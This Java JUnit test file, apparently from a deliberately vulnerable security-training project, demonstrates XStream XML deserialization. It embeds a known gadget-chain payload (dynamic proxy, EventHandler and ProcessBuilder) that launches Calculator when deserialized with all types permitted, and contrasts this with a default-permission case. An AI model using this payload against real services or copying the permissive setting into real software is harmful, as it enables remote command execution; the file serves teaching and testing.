package org.test;

import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.xml.DomDriver;
import com.thoughtworks.xstream.security.AnyTypePermission;
import org.joychou.dao.User;
import org.junit.Test;

public class XStreamTest {

    private static final String sample_xml = "<sorted-set>\n" +
            "    <string>foo</string>\n" +
            "    <dynamic-proxy>\n" +
            "        <interface>java.lang.Comparable</interface>\n" +
            "        <handler class=\"java.beans.EventHandler\">\n" +
            "            <target class=\"java.lang.ProcessBuilder\">\n" +
            "                <command>\n" +
            "                    <string>Open</string>\n" +
            "                    <string>-a</string>\n" +
            "                    <string>Calculator</string>\n" +
            "                </command>\n" +
            "            </target>\n" +
            "            <action>start</action>\n" +
            "        </handler>\n" +
            "    </dynamic-proxy>\n" +
            "</sorted-set>";


    /**
     * XStream basic usage.
     */
    @Test
    public void basicUsage() {
        User user = new User();
        user.setId(0);
        user.setUsername("admin");

        XStream xstream = new XStream(new DomDriver());
        String xml = xstream.toXML(user); // Serialize
        System.out.println(xml);

        // High version xstream needs set allowTypes
        xstream.allowTypes(new Class[]{User.class});
        user = (User) xstream.fromXML(xml); // Deserialize
        System.out.println(user.getId() + ": " + user.getUsername());
    }

    /**
     * Command execute
     */
    @Test
    public void case01() {
        System.out.println(sample_xml);
        XStream xstream = new XStream();
        xstream.addPermission(AnyTypePermission.ANY); 
        xstream.fromXML(sample_xml); // Deserialize
    }


    
    @Test
    public void sec01() {
        System.out.println(sample_xml);
        XStream xstream = new XStream();
        xstream.fromXML(sample_xml); // Deserialize
    }

}
